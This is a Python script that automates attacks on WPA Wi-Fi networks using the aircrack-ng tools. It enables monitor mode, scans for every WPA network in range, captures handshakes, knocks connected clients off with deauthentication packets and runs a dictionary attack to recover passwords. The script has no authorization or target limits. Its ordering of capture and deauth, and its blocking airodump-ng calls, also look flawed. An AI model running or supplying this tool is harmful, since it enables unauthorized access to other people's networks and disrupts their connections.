import os
import time

def setup_monitor_mode(interface="wlan0"):
    print("[*] Setting up monitor mode...")
    os.system(f"airmon-ng start {interface}")
    return f"{interface}mon"

def scan_wifi(interface="wlan0mon"):
    print("[*] Scanning for Wi-Fi networks...")
    os.system(f"airodump-ng -w scan_results --output-format csv {interface}")
    print("[*] Scan completed. Networks saved in 'scan_results.csv'.")
    return "scan_results-01.csv"

def parse_scan_results(scan_file):
    networks = []
    with open(scan_file, "r") as f:
        for line in f:
            if "WPA" in line and "," in line:  # Filter for WPA networks
                parts = line.split(",")
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    ssid = parts[13].strip()
                    networks.append({"bssid": bssid, "channel": channel, "ssid": ssid})
    return networks

def capture_handshake(bssid, channel, interface="wlan0mon"):
    print(f"[*] Capturing handshake for BSSID: {bssid} on channel {channel}...")
    os.system(f"airodump-ng --bssid {bssid} --channel {channel} --write handshake {interface}")
    time.sleep(10)  # Allow time for handshake capture

def deauth_clients(bssid, interface="wlan0mon"):
    print(f"[*] Deauthenticating clients for BSSID: {bssid}...")
    os.system(f"aireplay-ng --deauth 5 -a {bssid} {interface}")

def dictionary_attack(handshake_file="handshake-01.cap", wordlist="/path/to/wordlist.txt", bssid=None):
    print("[*] Starting dictionary attack...")
    cmd = f"aircrack-ng -w {wordlist} -b {bssid} {handshake_file}"
    os.system(cmd)

def main():
    # Step 1: Set up monitor mode
    interface = setup_monitor_mode()

    # Step 2: Scan Wi-Fi networks
    scan_file = scan_wifi(interface)

    # Step 3: Parse scan results
    print("[*] Parsing scan results...")
    networks = parse_scan_results(scan_file)
    if not networks:
        print("[!] No WPA networks found.")
        return

    print("[*] Networks found:")
    for idx, net in enumerate(networks):
        print(f"{idx + 1}: BSSID: {net['bssid']}, Channel: {net['channel']}, SSID: {net['ssid']}")

    # Step 4: Capture handshake and attack each network
    wordlist = "/path/to/your/wordlist.txt"  # Replace with your wordlist path
    for net in networks:
        bssid = net["bssid"]
        channel = net["channel"]
        ssid = net["ssid"]

        print(f"[*] Targeting network: {ssid} (BSSID: {bssid}, Channel: {channel})")
        capture_handshake(bssid, channel, interface)
        deauth_clients(bssid, interface)
        dictionary_attack(handshake_file="handshake-01.cap", wordlist=wordlist, bssid=bssid)

    print("[*] Done. Check the results above.")

if __name__ == "__main__":
    main()
      
